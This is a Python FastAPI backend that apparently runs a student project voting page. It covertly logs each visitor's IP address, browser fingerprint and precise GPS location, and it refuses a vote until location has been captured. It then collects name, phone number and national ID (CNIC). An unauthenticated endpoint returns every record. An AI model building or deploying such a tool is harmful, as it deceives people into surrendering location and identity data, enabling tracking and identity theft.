from fastapi import FastAPI, Request, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from motor.motor_asyncio import AsyncIOMotorClient
from bson import ObjectId
from bson.errors import InvalidId
from datetime import datetime, timezone
import os
import re

MONGODB_URI = os.environ.get("MONGODB_URI")
if not MONGODB_URI:
    raise RuntimeError("MONGODB_URI environment variable is not set")

app = FastAPI()
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"],
)

client = AsyncIOMotorClient(MONGODB_URI)
db = client["studentDB"]
collection = db["location"]

CANDIDATES = [
    {"id": "usman",  "name": "Muhammad Usman", "project": "Smart Campus Navigation System"},
    {"id": "ali",    "name": "Ali Raza",       "project": "AI-Powered Student Attendance Portal"},
    {"id": "hassan", "name": "Hassan Ahmed",   "project": "Blockchain-Based Degree Verification"},
    {"id": "fatima", "name": "Fatima Khan",    "project": "IoT Smart Library Management"},
    {"id": "bilal",  "name": "Bilal Hussain",  "project": "Cloud-Based Exam Scheduling Platform"},
]


class SessionData(BaseModel):
    user_agent: str | None = None
    platform: str | None = None
    language: str | None = None
    languages: str | None = None
    screen: str | None = None
    viewport: str | None = None
    timezone: str | None = None
    touch: bool | None = None
    referrer: str | None = None
    page_url: str | None = None
    client_time: str | None = None


class LocationUpdate(BaseModel):
    record_id: str
    latitude: float
    longitude: float
    accuracy: float | None = None
    altitude: float | None = None
    altitude_accuracy: float | None = None
    heading: float | None = None
    speed: float | None = None
    timestamp: float | None = None


class VoteSubmission(BaseModel):
    record_id: str
    name: str
    phone: str
    cnic: str
    candidate_id: str


def client_ip(request: Request) -> str:
    fwd = request.headers.get("x-forwarded-for")
    if fwd:
        return fwd.split(",")[0].strip()
    real = request.headers.get("x-real-ip")
    if real:
        return real.strip()
    return request.client.host if request.client else "unknown"


def validate_phone(p: str) -> bool:
    return bool(re.fullmatch(r"03\d{2}-?\d{7}", p.strip()))


def validate_cnic(c: str) -> bool:
    return bool(re.fullmatch(r"\d{5}-?\d{7}-?\d", c.strip()))


@app.get("/api/candidates")
async def candidates():
    return CANDIDATES


@app.post("/api/location")
async def receive_location(payload: SessionData, request: Request):
    ip = client_ip(request)
    doc = {
        "ip": ip,
        **payload.model_dump(exclude_none=True),
        "server_headers": {
            "user_agent": request.headers.get("user-agent"),
            "referer": request.headers.get("referer"),
            "accept_language": request.headers.get("accept-language"),
            "host": request.headers.get("host"),
            "origin": request.headers.get("origin"),
        },
        "server_received_at": datetime.now(timezone.utc),
        "location_updated_at": None,
        "vote_submitted_at": None,
        "name": None, "phone": None, "cnic": None,
        "candidate_id": None, "candidate_name": None, "candidate_project": None,
    }
    result = await collection.insert_one(doc)
    return {"status": "ok", "record_id": str(result.inserted_id), "ip": ip}


@app.post("/api/location/update")
async def update_location(payload: LocationUpdate):
    try:
        oid = ObjectId(payload.record_id)
    except InvalidId:
        raise HTTPException(400, "Invalid record_id")

    update = {k: v for k, v in payload.model_dump(exclude={"record_id"}).items() if v is not None}
    update["location_updated_at"] = datetime.now(timezone.utc)

    res = await collection.update_one({"_id": oid}, {"$set": update})
    if res.matched_count == 0:
        raise HTTPException(404, "record not found")
    return {"status": "ok", "record_id": payload.record_id}


@app.post("/api/submit")
async def submit_vote(payload: VoteSubmission):
    try:
        oid = ObjectId(payload.record_id)
    except InvalidId:
        raise HTTPException(400, "Invalid record_id")

    name = payload.name.strip()
    if len(name) < 3:
        raise HTTPException(400, "Name too short")
    if not validate_phone(payload.phone):
        raise HTTPException(400, "Invalid phone (expected 03XXXXXXXXX)")
    if not validate_cnic(payload.cnic):
        raise HTTPException(400, "Invalid CNIC (expected XXXXX-XXXXXXX-X)")

    candidate = next((c for c in CANDIDATES if c["id"] == payload.candidate_id), None)
    if not candidate:
        raise HTTPException(400, "Unknown candidate")

    res = await collection.update_one(
        {"_id": oid, "location_updated_at": {"$ne": None}},
        {"$set": {
            "name": name,
            "phone": payload.phone.strip(),
            "cnic": payload.cnic.strip(),
            "candidate_id": candidate["id"],
            "candidate_name": candidate["name"],
            "candidate_project": candidate["project"],
            "vote_submitted_at": datetime.now(timezone.utc),
        }},
    )
    if res.matched_count == 0:
        raise HTTPException(400, "Record not found or location not captured")
    return {"status": "ok", "record_id": payload.record_id, "candidate": candidate}


@app.get("/api/records")
async def get_records(limit: int = 500):
    cursor = collection.find({}).sort("server_received_at", -1).limit(min(limit, 1000))
    out = []
    async for r in cursor:
        r["_id"] = str(r["_id"])
        for k in ("server_received_at", "location_updated_at", "vote_submitted_at"):
            if isinstance(r.get(k), datetime):
                r[k] = r[k].isoformat()
        out.append(r)
    return out


@app.get("/api/stats")
async def get_stats():
    total = await collection.count_documents({})
    with_loc = await collection.count_documents({"location_updated_at": {"$ne": None}})
    votes = await collection.count_documents({"vote_submitted_at": {"$ne": None}})
    pipeline = [
        {"$match": {"vote_submitted_at": {"$ne": None}}},
        {"$group": {"_id": "$candidate_name", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
    ]
    tally = []
    async for row in collection.aggregate(pipeline):
        tally.append({"candidate": row["_id"], "votes": row["count"]})
    return {
        "total_records": total,
        "records_with_location": with_loc,
        "votes_submitted": votes,
        "tally": tally,
    }